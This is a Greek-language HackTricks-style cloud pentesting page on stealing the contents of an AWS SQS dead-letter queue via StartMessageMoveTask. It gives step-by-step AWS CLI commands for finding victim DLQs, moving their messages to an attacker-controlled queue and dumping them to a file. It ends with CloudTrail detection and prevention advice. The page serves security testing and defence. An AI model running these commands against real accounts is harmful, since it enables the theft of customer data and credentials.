# AWS – SQS DLQ Redrive Exfiltration via StartMessageMoveTask

{{#include ../../../banners/hacktricks-training.md}}

## Περιγραφή

Καταχρήστε τα SQS message move tasks για να κλέψετε όλα τα συσσωρευμένα μηνύματα από το Dead-Letter Queue (DLQ) ενός θύματος ανακατευθύνοντάς τα σε attacker-controlled queue χρησιμοποιώντας `sqs:StartMessageMoveTask`. Αυτή η τεχνική εκμεταλλεύεται τη νόμιμη λειτουργία ανάκτησης μηνυμάτων του AWS για να exfiltrate ευαίσθητα δεδομένα που έχουν συσσωρευτεί σε DLQs με την πάροδο του χρόνου.

## Τι είναι ένα Dead-Letter Queue (DLQ)?

Ένα Dead-Letter Queue είναι μια ειδική SQS ουρά όπου τα μηνύματα αποστέλλονται αυτόματα όταν δεν μπορούν να επεξεργαστούν επιτυχώς από την κύρια εφαρμογή. Αυτά τα αποτυχημένα μηνύματα συχνά περιέχουν:
- Ευαίσθητα δεδομένα εφαρμογής που δεν μπόρεσαν να επεξεργαστούν
- Λεπτομέρειες σφαλμάτων και πληροφορίες debugging
- Personal Identifiable Information (PII)
- API tokens, credentials, ή άλλα secrets
- Επιχειρησιακά κρίσιμα δεδομένα συναλλαγών

Τα DLQ λειτουργούν ως "νεκροταφείο" για αποτυχημένα μηνύματα, καθιστώντας τα πολύτιμους στόχους αφού συσσωρεύουν ευαίσθητα δεδομένα με την πάροδο του χρόνου που οι εφαρμογές δεν κατάφεραν να επεξεργαστούν σωστά.

## Σενάριο επίθεσης

**Παράδειγμα πραγματικού κόσμου:**
1. **E-commerce application** επεξεργάζεται παραγγελίες πελατών μέσω SQS
2. **Μερικές παραγγελίες αποτυγχάνουν** (προβλήματα πληρωμής, αποθέματος, κ.λπ.) και μετακινούνται σε DLQ
3. **Το DLQ συσσωρεύει** εβδομάδες/μήνες αποτυχημένων παραγγελιών που περιέχουν δεδομένα πελατών: `{"customerId": "12345", "creditCard": "4111-1111-1111-1111", "orderTotal": "$500"}`
4. **Ο attacker αποκτά πρόσβαση** σε AWS credentials με δικαιώματα SQS
5. **Ο attacker ανακαλύπτει** ότι το DLQ περιέχει χιλιάδες αποτυχημένες παραγγελίες με ευαίσθητα δεδομένα
6. **Αντί να προσπαθήσει να προσεγγίσει μεμονωμένα μηνύματα** (αργό και προφανές), ο attacker χρησιμοποιεί `StartMessageMoveTask` για μαζική μεταφορά ΟΛΩΝ των μηνυμάτων στην δική του ουρά
7. **Ο attacker εξάγει** όλα τα ιστορικά ευαίσθητα δεδομένα με μία ενέργεια

## Απαιτήσεις
- Η source queue πρέπει να έχει ρυθμιστεί ως DLQ (αναφέρεται από τουλάχιστον μία queue RedrivePolicy).
- IAM permissions (εκτελούμενα ως το συμβεβλημένο με το περιστατικό victim principal):
- Στο DLQ (source): `sqs:StartMessageMoveTask`, `sqs:GetQueueAttributes`.
- Στην destination queue: δικαίωμα παράδοσης μηνυμάτων (π.χ. queue policy που επιτρέπει `sqs:SendMessage` από το victim principal). Για προορισμούς στο ίδιο account αυτό συνήθως επιτρέπεται από προεπιλογή.
- Αν είναι ενεργοποιημένο το SSE-KMS: στο source CMK `kms:Decrypt`, και στο destination CMK `kms:GenerateDataKey`, `kms:Encrypt`.

## Impact
Exfiltrate ευαίσθητα payloads που έχουν συσσωρευτεί σε DLQs (αποτυχημένα events, PII, tokens, application payloads) με μεγάλη ταχύτητα χρησιμοποιώντας τα εγγενή SQS APIs. Λειτουργεί cross-account εάν η policy της destination queue επιτρέπει `SendMessage` από το victim principal.

## Πώς να Καταχραστείτε

- Εντοπίστε το ARN του victim DLQ και βεβαιωθείτε ότι αναφέρεται πράγματι ως DLQ από κάποια ουρά (οποιαδήποτε ουρά είναι επαρκής).
- Δημιουργήστε ή επιλέξτε μια attacker-controlled destination queue και λάβετε το ARN της.
- Ξεκινήστε ένα message move task από το victim DLQ προς την destination queue σας.
- Παρακολουθήστε την πρόοδο ή ακυρώστε εάν χρειαστεί.

### CLI Example: Exfiltrating Customer Data from E-commerce DLQ

**Scenario**: Ένας attacker έχει συμβιβαστεί AWS credentials και ανακάλυψε ότι μια e-commerce εφαρμογή χρησιμοποιεί SQS με ένα DLQ που περιέχει αποτυχημένες προσπάθειες επεξεργασίας παραγγελιών πελατών.

1) **Discover and examine the victim DLQ**
```bash
# List queues to find DLQs (look for names containing 'dlq', 'dead', 'failed', etc.)
aws sqs list-queues --queue-name-prefix dlq

# Let's say we found: https://sqs.us-east-1.amazonaws.com/123456789012/ecommerce-orders-dlq
VICTIM_DLQ_URL="https://sqs.us-east-1.amazonaws.com/123456789012/ecommerce-orders-dlq"
SRC_ARN=$(aws sqs get-queue-attributes --queue-url "$VICTIM_DLQ_URL" --attribute-names QueueArn --query Attributes.QueueArn --output text)

# Check how many messages are in the DLQ (potential treasure trove!)
aws sqs get-queue-attributes --queue-url "$VICTIM_DLQ_URL" \
--attribute-names ApproximateNumberOfMessages
# Output might show: "ApproximateNumberOfMessages": "1847"
```
2) **Δημιουργία ουράς προορισμού ελεγχόμενης από attacker**
```bash
# Create our exfiltration queue
ATTACKER_Q_URL=$(aws sqs create-queue --queue-name hacker-exfil-$(date +%s) --query QueueUrl --output text)
ATTACKER_Q_ARN=$(aws sqs get-queue-attributes --queue-url "$ATTACKER_Q_URL" --attribute-names QueueArn --query Attributes.QueueArn --output text)

echo "Created exfiltration queue: $ATTACKER_Q_ARN"
```
3) **Εκτέλεση μαζικής κλοπής μηνυμάτων**
```bash
# Start moving ALL messages from victim DLQ to our queue
# This operation will transfer thousands of failed orders containing customer data
echo "Starting bulk exfiltration of $SRC_ARN to $ATTACKER_Q_ARN"
TASK_RESPONSE=$(aws sqs start-message-move-task \
--source-arn "$SRC_ARN" \
--destination-arn "$ATTACKER_Q_ARN" \
--max-number-of-messages-per-second 100)

echo "Move task started: $TASK_RESPONSE"

# Monitor the theft progress
aws sqs list-message-move-tasks --source-arn "$SRC_ARN" --max-results 10
```
4) **Συλλέξτε τα κλεμμένα ευαίσθητα δεδομένα**
```bash
# Receive the exfiltrated customer data
echo "Receiving stolen customer data..."
aws sqs receive-message --queue-url "$ATTACKER_Q_URL" \
--attribute-names All --message-attribute-names All \
--max-number-of-messages 10 --wait-time-seconds 5

# Example of what an attacker might see:
# {
#   "Body": "{\"customerId\":\"cust_12345\",\"email\":\"john@example.com\",\"creditCard\":\"4111-1111-1111-1111\",\"orderTotal\":\"$299.99\",\"failureReason\":\"Payment declined\"}",
#   "MessageId": "12345-abcd-6789-efgh"
# }

# Continue receiving all messages in batches
while true; do
MESSAGES=$(aws sqs receive-message --queue-url "$ATTACKER_Q_URL" \
--max-number-of-messages 10 --wait-time-seconds 2 --output json)

if [ "$(echo "$MESSAGES" | jq '.Messages | length')" -eq 0 ]; then
echo "No more messages - exfiltration complete!"
break
fi

echo "Received batch of stolen data..."
# Process/save the stolen customer data
echo "$MESSAGES" >> stolen_customer_data.json
done
```
### Σημειώσεις δια-λογαριασμού
- Η προοριζόμενη ουρά πρέπει να έχει resource policy που επιτρέπει στον principal του θύματος να εκτελεί `sqs:SendMessage` (και, αν χρησιμοποιείται, KMS grants/permissions).

## Γιατί αυτή η επίθεση είναι αποτελεσματική

1. **Νόμιμη λειτουργία AWS**: Χρησιμοποιεί ενσωματωμένη λειτουργικότητα του AWS, καθιστώντας δύσκολη την ανίχνευσή της ως κακόβουλη
2. **Μαζική λειτουργία**: Μεταφέρει χιλιάδες μηνύματα γρήγορα αντί για αργή μεμονωμένη πρόσβαση
3. **Ιστορικά δεδομένα**: Οι DLQs συσσωρεύουν ευαίσθητα δεδομένα σε βάθος εβδομάδων/μηνών
4. **Υπό το ραντάρ**: Πολλές οργανώσεις δεν παρακολουθούν στενά την πρόσβαση σε DLQs
5. **Δυνατότητα cross-account**: Μπορεί να exfiltrate στο AWS account του επιτιθέμενου αν τα δικαιώματα το επιτρέπουν

## Ανίχνευση και Πρόληψη

### Ανίχνευση
Παρακολουθήστε το CloudTrail για ύποπτες κλήσεις API `StartMessageMoveTask`:
```json
{
"eventName": "StartMessageMoveTask",
"sourceIPAddress": "suspicious-ip",
"userIdentity": {
"type": "IAMUser",
"userName": "compromised-user"
},
"requestParameters": {
"sourceArn": "arn:aws:sqs:us-east-1:123456789012:sensitive-dlq",
"destinationArn": "arn:aws:sqs:us-east-1:attacker-account:exfil-queue"
}
}
```
### Πρόληψη
1. **Ελάχιστα δικαιώματα**: Περιορίστε τα δικαιώματα `sqs:StartMessageMoveTask` μόνο στους αναγκαίους ρόλους
2. **Παρακολούθηση DLQs**: Ρυθμίστε ειδοποιήσεις CloudWatch για ασυνήθη δραστηριότητα σε DLQs
3. **Πολιτικές διασταυρούμενων λογαριασμών**: Ελέγξτε προσεκτικά τις SQS queue policies που επιτρέπουν πρόσβαση μεταξύ λογαριασμών
4. **Κρυπτογραφήστε DLQs**: Χρησιμοποιήστε SSE-KMS με περιορισμένες πολιτικές κλειδιών
5. **Τακτικός καθαρισμός**: Μην αφήνετε ευαίσθητα δεδομένα να συσσωρεύονται σε DLQs επ' αόριστον

{{#include ../../../banners/hacktricks-training.md}}
